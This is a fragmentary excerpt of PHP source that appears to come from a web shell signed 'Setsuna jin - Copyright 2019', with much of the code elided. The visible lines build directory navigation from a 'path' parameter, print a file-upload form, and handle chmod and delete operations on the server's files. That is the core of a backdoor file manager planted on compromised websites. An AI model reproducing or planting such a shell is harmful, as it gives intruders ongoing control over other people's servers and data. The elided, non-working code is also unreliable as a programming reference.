...
foreach($paths as $id=>$pat){
   ...
   if($pat == '') continue;
      echo '<a href="?path=';for($i=0;$i<=$id;$i++){echo "$paths[$i]";if($i != $id) echo "/";}echo '">'.$pat.'</a>/';
   }
   echo '</td></tr><tr><td>';
   ...
   echo '<form enctype="multipart/form-data" method="POST"><font color="white">File Upload :</font> <input type="file" name="file" /><input type="submit" value="upload" /></form></td></tr>';
       ...
       if($_POST['opt'] == 'chmod'){
            ...
            if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
                if($_POST['type'] == 'dir'){
					...
					echo '<center><br/>Setsuna jin - Copyright 2019</center>
					</body>
					</html>';
